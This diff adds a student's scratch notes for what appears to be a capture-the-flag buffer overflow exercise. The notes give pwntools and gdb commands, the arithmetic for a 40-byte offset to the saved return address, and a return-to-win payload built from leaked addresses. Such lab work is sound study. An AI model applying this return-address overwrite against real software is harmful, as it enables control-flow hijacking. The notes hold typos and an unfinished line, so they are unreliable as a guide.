@@ -1,0 +1,34 @@
+
+pwn template ./service > template.py
+sudo apt install gdbserver
+python3 ./template.py GDB
+onjdump -d ./service | less
+p/x $rip
+x/i $pc
+x/10x $rsp
+x/10gx $rsp
+
+rbp addr - buf addr + 8 // win location
+
+current return addr - offset stastically + add win address stastically shown // get current win start address
+
+objdump -d ./service | less
+
+0x564ae99447e9 - 0x17e9 + 0x151a // win address // '0x564ae994451a' // 0x55f9963c351a
+
+0x7ffff8061110 - 0x7ffff80610f0 + 8 // 40
+'a'*40 + 0x564ae994451a
+
+'a'*(0x7ffff8061110 - 0x7ffff80610f0 + 8) + 0x564ae994451a
+
+0x61 *(0x7ffff8061110 - 0x7ffff80610f0 + 8) + 0x564ae994451a  // '0x564ae9945442'
+
+===================
+
+address of buffer // 0x7fffffffdf40
+saved rip // 0x7fffffffdf68
+rbp // 0x7fffffffdf60
+
+0x7fffffffdf68 - 
+
+0x5555555558e9 - 0x18e9 + 0x151a // '0x55555555551a'
